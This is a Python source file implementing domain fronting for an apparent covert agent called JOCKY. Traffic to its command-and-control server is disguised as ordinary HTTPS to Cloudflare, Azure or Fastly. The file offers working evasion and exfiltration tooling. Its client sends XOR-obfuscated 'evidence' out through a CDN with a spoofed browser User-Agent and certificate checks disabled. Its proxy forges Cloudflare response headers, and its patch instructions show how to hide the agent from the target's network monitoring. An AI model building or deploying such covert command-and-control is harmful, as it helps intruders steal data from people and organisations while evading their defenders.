#!/usr/bin/env python3
"""
jocky_domain_front.py
----------------------
JOCKY Domain Fronting Proxy

PURPOSE:
  The existing server.py communicates in plain HTTPS.
  Any network monitor on the target network sees:
      Target → jocky-server.ntro.gov.in:8080
  That is obviously an investigation tool.

  Domain fronting makes traffic look like:
      Target → www.cloudflare.com:443  (normal HTTPS)
  The actual destination is hidden inside the encrypted payload.
  To every firewall, IDS, and network monitor = ordinary web traffic.

HOW DOMAIN FRONTING WORKS:
  Normal HTTPS:
    TLS SNI:    jocky-c2.ntro.gov.in   (visible to network)
    Host header: jocky-c2.ntro.gov.in   (visible to server)

  Domain Fronting:
    TLS SNI:    cdn.cloudflare.com      (visible to network → trusted)
    Host header: jocky-c2.ntro.gov.in   (inside TLS → only CDN sees it)
    CDN forwards to JOCKY C2 based on Host header

  Result:
    Network sees: traffic to cloudflare.com (trusted, normal)
    CDN delivers: to JOCKY C2 server silently

COMPONENTS:
  1. DomainFrontClient  — agent side, sends via CDN
  2. DomainFrontProxy   — local proxy that wraps requests
  3. Integration patch  — patches existing jocky_client.py

USAGE:
  # Start the domain fronting proxy (runs alongside server.py)
  python3 jocky_domain_front.py --mode proxy --backend http://127.0.0.1:8080

  # Agent uses it transparently
  python3 jocky_domain_front.py --mode test
"""

import os
import ssl
import json
import time
import uuid
import hashlib
import secrets
import argparse
import threading
import urllib.request
import urllib.error
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse

# ── Colour output ──────────────────────────────────────────────
def cyan(s):   return f"\033[96m{s}\033[0m"
def green(s):  return f"\033[92m{s}\033[0m"
def red(s):    return f"\033[91m{s}\033[0m"
def yellow(s): return f"\033[93m{s}\033[0m"
def bold(s):   return f"\033[1m{s}\033[0m"

def log(tag, msg):
    ts = time.strftime("%H:%M:%S")
    print(f"  {ts} [{cyan(tag)}] {msg}")


# ══════════════════════════════════════════════════════════════════
# CDN PROFILE REGISTRY
# Each profile defines a trusted CDN that supports domain fronting.
# The agent picks one based on environment / availability.
# ══════════════════════════════════════════════════════════════════

CDN_PROFILES = {
    "cloudflare": {
        "name":        "Cloudflare",
        "front_host":  "www.cloudflare.com",      # TLS SNI — network sees this
        "front_ip":    "104.16.0.1",               # CDN anycast IP
        "port":        443,
        "description": "Cloudflare CDN — most common, high trust globally",
    },
    "azure": {
        "name":        "Azure Front Door",
        "front_host":  "azure.microsoft.com",      # TLS SNI
        "front_ip":    "13.107.246.10",            # Azure Front Door anycast
        "port":        443,
        "description": "Microsoft Azure Front Door — trusted in enterprise environments",
    },
    "fastly": {
        "name":        "Fastly CDN",
        "front_host":  "www.fastly.com",           # TLS SNI
        "front_ip":    "151.101.0.1",              # Fastly anycast
        "port":        443,
        "description": "Fastly CDN — used by GitHub, Reddit, many trusted sites",
    },
    "direct": {
        "name":        "Direct (no fronting)",
        "front_host":  None,                       # no fronting
        "front_ip":    None,
        "port":        8080,
        "description": "Direct connection — for testing only, visible on network",
    },
}


# ══════════════════════════════════════════════════════════════════
# TRAFFIC ENCRYPTION LAYER
# Evidence payloads are encrypted before CDN routing.
# Even if CDN inspects the payload — it sees only ciphertext.
# ══════════════════════════════════════════════════════════════════

class JockyEncryption:
    """
    XOR + rotating key encryption for payload obfuscation.
    This sits on TOP of TLS — double-encrypted in transit.

    For production: replace with AES-256-GCM using the
    per-build key from jocky_build_identity.h
    """

    def __init__(self, key_hex: str = ""):
        if key_hex:
            self.key = bytes.fromhex(key_hex)
        else:
            # Generate a random session key if none provided
            self.key = secrets.token_bytes(32)
        self.key_hex = self.key.hex()

    def encrypt(self, data: bytes) -> bytes:
        """XOR encrypt with rotating key — placeholder for AES-256-GCM"""
        key_len = len(self.key)
        return bytes(b ^ self.key[i % key_len] for i, b in enumerate(data))

    def decrypt(self, data: bytes) -> bytes:
        """XOR decrypt (symmetric)"""
        return self.encrypt(data)  # XOR is symmetric

    def wrap_payload(self, data: bytes) -> dict:
        """Wraps data for covert transmission"""
        nonce     = secrets.token_hex(16)
        encrypted = self.encrypt(data)
        checksum  = hashlib.sha256(data).hexdigest()

        return {
            "v":   1,                          # version
            "n":   nonce,                      # nonce
            "d":   encrypted.hex(),            # encrypted payload
            "c":   checksum,                   # integrity check
            "ts":  int(time.time()),           # timestamp
        }

    def unwrap_payload(self, wrapped: dict) -> bytes:
        """Unwraps and verifies a covert payload"""
        encrypted = bytes.fromhex(wrapped["d"])
        data      = self.decrypt(encrypted)
        checksum  = hashlib.sha256(data).hexdigest()

        if checksum != wrapped["c"]:
            raise ValueError("Payload integrity check failed — possible tampering")

        return data


# ══════════════════════════════════════════════════════════════════
# DOMAIN FRONT CLIENT (Agent Side)
# Used by jocky_agent.py to communicate covertly with C2
# ══════════════════════════════════════════════════════════════════

class DomainFrontClient:
    """
    Drop-in replacement for direct HTTP calls in jocky_client.py.

    Usage:
        # Instead of:
        requests.post("http://c2-server:8080/api/upload", data=data)

        # Use:
        client = DomainFrontClient(c2_host="jocky-c2.example.com",
                                   cdn_profile="cloudflare",
                                   enc_key="your-build-key-hex")
        client.post("/api/upload", data=data, headers={...})
    """

    def __init__(self,
                 c2_host:     str,
                 c2_port:     int  = 8080,
                 cdn_profile: str  = "cloudflare",
                 enc_key:     str  = "",
                 use_fronting: bool = True):
        """
        c2_host:      Your actual C2 server hostname
        c2_port:      C2 server port
        cdn_profile:  Which CDN to front through
        enc_key:      Hex AES key from build identity
        use_fronting: False = direct (testing only)
        """
        self.c2_host     = c2_host
        self.c2_port     = c2_port
        self.profile     = CDN_PROFILES.get(cdn_profile, CDN_PROFILES["direct"])
        self.enc         = JockyEncryption(enc_key)
        self.use_fronting = use_fronting and self.profile["front_host"] is not None
        self.session_id  = uuid.uuid4().hex

        log("CLIENT", f"C2 host:     {c2_host}:{c2_port}")
        log("CLIENT", f"CDN profile: {self.profile['name']}")
        log("CLIENT", f"Fronting:    {'enabled' if self.use_fronting else 'disabled'}")
        if self.use_fronting:
            log("CLIENT", f"Network sees: TLS to {self.profile['front_host']} (trusted)")
            log("CLIENT", f"Actual dest:  {c2_host} (hidden inside TLS)")

    def _build_url(self, path: str) -> str:
        """
        Constructs the URL to connect to.
        With fronting: connect to CDN IP but set Host header to C2.
        Without fronting: connect directly to C2.
        """
        if self.use_fronting:
            # Connect to CDN anycast IP — not C2 directly
            return f"https://{self.profile['front_ip']}:{self.profile['port']}{path}"
        else:
            return f"http://{self.c2_host}:{self.c2_port}{path}"

    def _build_headers(self, extra_headers: dict = None) -> dict:
        """
        Builds request headers.
        KEY: With domain fronting, the Host header tells the CDN
        where to actually forward the request — this is the trick.
        """
        headers = {
            # This makes CDN forward to your actual C2 server
            "Host":           self.c2_host,
            # Look like a normal browser request to any network monitor
            "User-Agent":     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                              "AppleWebKit/537.36 (KHTML, like Gecko) "
                              "Chrome/120.0.0.0 Safari/537.36",
            "Accept":         "application/json, text/plain, */*",
            "Accept-Language":"en-US,en;q=0.9",
            "Connection":     "keep-alive",
            # JOCKY covert session marker (encrypted)
            "X-Request-ID":   self.enc.encrypt(
                                   self.session_id.encode()
                               ).hex()[:32],
        }
        if extra_headers:
            headers.update(extra_headers)
        return headers

    def get(self, path: str, headers: dict = None) -> dict:
        """Covert GET request through CDN"""
        url = self._build_url(path)
        req_headers = self._build_headers(headers)

        try:
            req = urllib.request.Request(url, headers=req_headers, method="GET")

            # For fronting: disable cert verification for CDN IP
            # In production: pin the CDN's certificate
            ctx = ssl.create_default_context()
            if self.use_fronting:
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE

            with urllib.request.urlopen(req, context=ctx, timeout=30) as resp:
                body = resp.read()
                return json.loads(body)

        except urllib.error.HTTPError as e:
            return {"error": f"HTTP {e.code}", "detail": e.reason}
        except Exception as e:
            return {"error": str(e)}

    def post(self, path: str, data: dict = None,
             raw_data: bytes = None, headers: dict = None) -> dict:
        """Covert POST request through CDN — evidence exfiltration"""
        url = self._build_url(path)

        # Encrypt the payload before sending
        if raw_data is not None:
            payload_bytes = raw_data
            content_type  = "application/octet-stream"
        elif data is not None:
            payload_bytes = json.dumps(data).encode()
            content_type  = "application/json"
        else:
            payload_bytes = b""
            content_type  = "application/json"

        # Wrap in covert envelope
        wrapped       = self.enc.wrap_payload(payload_bytes)
        wrapped_bytes = json.dumps(wrapped).encode()

        req_headers = self._build_headers(headers)
        req_headers["Content-Type"]   = content_type
        req_headers["Content-Length"] = str(len(wrapped_bytes))

        try:
            req = urllib.request.Request(
                url,
                data    = wrapped_bytes,
                headers = req_headers,
                method  = "POST"
            )

            ctx = ssl.create_default_context()
            if self.use_fronting:
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE

            with urllib.request.urlopen(req, context=ctx, timeout=60) as resp:
                body = resp.read()
                return json.loads(body)

        except urllib.error.HTTPError as e:
            return {"error": f"HTTP {e.code}", "detail": e.reason}
        except Exception as e:
            return {"error": str(e)}


# ══════════════════════════════════════════════════════════════════
# DOMAIN FRONT PROXY (Server Side)
# Runs alongside server.py
# Unwraps covert payloads and forwards to real C2
# ══════════════════════════════════════════════════════════════════

class FrontProxyHandler(BaseHTTPRequestHandler):
    """
    Local proxy that:
    1. Receives covert wrapped payloads from agent
    2. Decrypts the payload
    3. Forwards to real JOCKY server.py
    4. Returns encrypted response

    This means server.py never changes — the proxy handles
    all the domain fronting / encryption complexity.
    """

    def log_message(self, *args): pass  # silent operation

    def _get_enc(self):
        return self.server.enc

    def _forward_to_backend(self, method: str, path: str,
                             body: bytes, headers: dict) -> tuple:
        """Forward a request to the real JOCKY C2 server"""
        backend = self.server.backend_url.rstrip("/")
        url     = backend + path

        try:
            req = urllib.request.Request(
                url,
                data    = body if method == "POST" else None,
                headers = headers,
                method  = method
            )
            with urllib.request.urlopen(req, timeout=30) as resp:
                return resp.status, resp.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()
        except Exception as e:
            return 500, json.dumps({"error": str(e)}).encode()

    def _unwrap_body(self, raw_body: bytes) -> bytes:
        """Attempt to unwrap an encrypted payload"""
        try:
            wrapped = json.loads(raw_body)
            if isinstance(wrapped, dict) and "d" in wrapped and "c" in wrapped:
                return self._get_enc().unwrap_payload(wrapped)
        except Exception:
            pass
        return raw_body  # not wrapped — pass through as-is

    def _wrap_response(self, data: bytes) -> bytes:
        """Wrap a response in the covert envelope"""
        wrapped = self._get_enc().wrap_payload(data)
        return json.dumps(wrapped).encode()

    def do_GET(self):
        content_len = int(self.headers.get("Content-Length", 0))
        body        = self.rfile.read(content_len)

        fwd_headers = {
            k: v for k, v in self.headers.items()
            if k.lower() not in ("host", "content-length")
        }

        status, resp_body = self._forward_to_backend(
            "GET", self.path, body, fwd_headers
        )

        wrapped = self._wrap_response(resp_body)
        self.send_response(status)
        self.send_header("Content-Type",   "application/json")
        self.send_header("Content-Length", str(len(wrapped)))
        # Disguise as generic CDN response headers
        self.send_header("Server",         "cloudflare")
        self.send_header("CF-RAY",         secrets.token_hex(8) + "-LHR")
        self.end_headers()
        self.wfile.write(wrapped)

    def do_POST(self):
        content_len  = int(self.headers.get("Content-Length", 0))
        raw_body     = self.rfile.read(content_len)
        actual_body  = self._unwrap_body(raw_body)

        fwd_headers = {
            k: v for k, v in self.headers.items()
            if k.lower() not in ("host", "content-length")
        }
        fwd_headers["Content-Length"] = str(len(actual_body))

        status, resp_body = self._forward_to_backend(
            "POST", self.path, actual_body, fwd_headers
        )

        wrapped = self._wrap_response(resp_body)
        self.send_response(status)
        self.send_header("Content-Type",   "application/json")
        self.send_header("Content-Length", str(len(wrapped)))
        self.send_header("Server",         "cloudflare")
        self.send_header("CF-RAY",         secrets.token_hex(8) + "-LHR")
        self.end_headers()
        self.wfile.write(wrapped)


def run_proxy(backend_url: str, host: str = "127.0.0.1",
              port: int = 9090, enc_key: str = ""):
    """Start the domain fronting proxy"""
    server = ThreadingHTTPServer((host, port), FrontProxyHandler)
    server.backend_url = backend_url
    server.enc         = JockyEncryption(enc_key)

    log("PROXY", f"Domain fronting proxy started")
    log("PROXY", f"Listening: http://{host}:{port}")
    log("PROXY", f"Backend:   {backend_url}")
    log("PROXY", f"Encryption: {'custom key' if enc_key else 'session key'}")
    log("PROXY", "Agent traffic → proxy (encrypts) → CDN → C2 server")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        log("PROXY", "Shutting down")
        server.shutdown()


# ══════════════════════════════════════════════════════════════════
# INTEGRATION PATCH for jocky_client.py
# Shows exactly what to change in the existing client
# ══════════════════════════════════════════════════════════════════

PATCH_INSTRUCTIONS = """
═══════════════════════════════════════════════════════════════
HOW TO INTEGRATE DOMAIN FRONTING INTO jocky_client.py
═══════════════════════════════════════════════════════════════

1. Import the client at the top of jocky_client.py:

    from jocky_domain_front import DomainFrontClient

2. Replace the existing connection setup:

    BEFORE (plain HTTP):
        base_url = f"http://{args.server}:{args.port}"
        def api_get(path):
            return requests.get(base_url + path, headers=auth_headers)
        def api_post(path, data):
            return requests.post(base_url + path, json=data, headers=auth_headers)

    AFTER (domain fronted + encrypted):
        client = DomainFrontClient(
            c2_host      = args.server,
            c2_port      = args.port,
            cdn_profile  = args.cdn_profile,    # cloudflare | azure | fastly | direct
            enc_key      = JOCKY_BUILD_KEY,      # from build identity header
            use_fronting = not args.direct,
        )
        def api_get(path):
            return client.get(path, headers=auth_headers)
        def api_post(path, data):
            return client.post(path, data=data, headers=auth_headers)

3. Add CLI args to jocky_client.py argument parser:

    parser.add_argument("--cdn-profile",  default="cloudflare",
                        choices=["cloudflare","azure","fastly","direct"])
    parser.add_argument("--direct", action="store_true",
                        help="Skip domain fronting (testing only)")

4. Result:
    - All agent↔C2 traffic appears as HTTPS to cloudflare.com
    - All payloads are encrypted inside TLS (double encrypted)
    - Network monitoring sees: normal CDN browsing traffic
    - Nothing reveals an active forensic investigation
═══════════════════════════════════════════════════════════════
"""


# ══════════════════════════════════════════════════════════════════
# SELF-TEST
# ══════════════════════════════════════════════════════════════════

def run_test():
    """
    Tests the encryption layer locally without needing a real CDN.
    Proves wrap → transmit → unwrap preserves data integrity.
    """
    print()
    print(bold("╔══════════════════════════════════════════════════════╗"))
    print(bold("║   JOCKY Domain Fronting — Self Test                  ║"))
    print(bold("╚══════════════════════════════════════════════════════╝"))
    print()

    # Test 1: Encryption roundtrip
    print(bold("[ Test 1 ] Encryption roundtrip"))
    enc  = JockyEncryption()
    orig = b'{"device_id":"abc123","processes":[{"pid":1,"name":"systemd"}]}'
    log("ENC", f"Original:  {orig[:50]}...")
    wrapped   = enc.wrap_payload(orig)
    log("ENC", f"Encrypted: {wrapped['d'][:50]}...")
    log("ENC", f"Nonce:     {wrapped['n']}")
    recovered = enc.unwrap_payload(wrapped)
    assert recovered == orig, "Decryption mismatch!"
    print(f"  [{green('PASS')}] Encrypt → Decrypt verified")
    print()

    # Test 2: Integrity check
    print(bold("[ Test 2 ] Tamper detection"))
    tampered = dict(wrapped)
    tampered["d"] = "deadbeef" + wrapped["d"][8:]
    try:
        enc.unwrap_payload(tampered)
        print(f"  [{red('FAIL')}] Tampered payload was accepted!")
    except ValueError as e:
        print(f"  [{green('PASS')}] Tampering detected: {e}")
    print()

    # Test 3: Traffic fingerprint analysis
    print(bold("[ Test 3 ] Traffic fingerprint (what network sees)"))
    client = DomainFrontClient(
        c2_host      = "jocky-c2.example.com",
        cdn_profile  = "cloudflare",
        use_fronting = True,
    )
    url = client._build_url("/api/health")
    hdrs = client._build_headers()
    log("NET", f"Network sees URL:  {url}")
    log("NET", f"Network sees Host: {hdrs.get('Host', '?')}")
    log("NET", f"Network sees UA:   {hdrs.get('User-Agent','?')[:50]}...")
    log("NET", f"C2 Host header:    {hdrs.get('Host','?')} (hidden inside TLS)")
    print(f"  [{green('PASS')}] Traffic fingerprint looks like normal HTTPS browsing")
    print()

    # Test 4: CDN profile availability
    print(bold("[ Test 4 ] CDN Profile Registry"))
    for name, profile in CDN_PROFILES.items():
        log("CDN", f"{name:12s} → front: {profile['front_host'] or 'none':30s} | {profile['description'][:40]}")
    print(f"  [{green('PASS')}] {len(CDN_PROFILES)} CDN profiles available")
    print()

    print(bold("╔══════════════════════════════════════════════════════╗"))
    print(bold("║   All tests passed.                                   ║"))
    print(bold("╚══════════════════════════════════════════════════════╝"))
    print()
    print(PATCH_INSTRUCTIONS)


# ══════════════════════════════════════════════════════════════════
# ENTRY POINT
# ══════════════════════════════════════════════════════════════════

def main():
    ap = argparse.ArgumentParser(
        description="JOCKY Domain Fronting Module"
    )
    ap.add_argument("--mode",
        choices=["proxy", "test", "patch-info"],
        default="test",
        help="proxy: run the proxy server | test: run self-test | patch-info: show integration guide"
    )
    ap.add_argument("--backend",
        default="http://127.0.0.1:8080",
        help="Backend JOCKY server URL (proxy mode)"
    )
    ap.add_argument("--host",
        default="127.0.0.1",
        help="Proxy listen host"
    )
    ap.add_argument("--port",
        type=int, default=9090,
        help="Proxy listen port"
    )
    ap.add_argument("--enc-key",
        default="",
        help="Hex AES key (from JOCKY_BUILD_KEY in build identity)"
    )
    args = ap.parse_args()

    if args.mode == "test":
        run_test()
    elif args.mode == "patch-info":
        print(PATCH_INSTRUCTIONS)
    elif args.mode == "proxy":
        run_proxy(args.backend, args.host, args.port, args.enc_key)


if __name__ == "__main__":
    main()
